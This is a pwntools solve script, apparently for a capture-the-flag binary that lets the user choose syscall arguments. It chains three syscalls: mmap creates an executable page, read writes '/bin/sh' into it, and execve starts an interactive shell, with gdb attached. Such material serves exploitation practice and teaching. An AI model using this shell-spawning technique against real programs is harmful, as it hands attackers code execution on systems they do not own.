from pwn import *

p = process('./challenge')
e = ELF('./challenge')
gdb.attach(p,'''
    b *main
''')


PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_SHARED = 0x1
MAP_FIXED = 0x10
MAP_PRIVATE = 0x2
MAP_ANONYMOUS = 0x20


p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0x4096))
p.sendlineafter('want for rdx?',str(PROT_READ|PROT_WRITE|PROT_EXEC))
p.sendlineafter('want for r10?',str(MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(9))

p.sendlineafter('Do another (0/1)?',str(0x1))
bin_sh = "/bin/sh\x00"

p.sendlineafter('want for rdi?',str(0x0))
p.sendlineafter('want for rsi?',str(0x1000000))
p.sendlineafter('want for rdx?',str(0x8))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(0))
p.send(bin_sh)

p.sendlineafter('Do another (0/1)?',str(0x1))

p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0))
p.sendlineafter('want for rdx?',str(0))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))
p.sendlineafter('syscall number to call?',str(0x3b))
p.interactive()

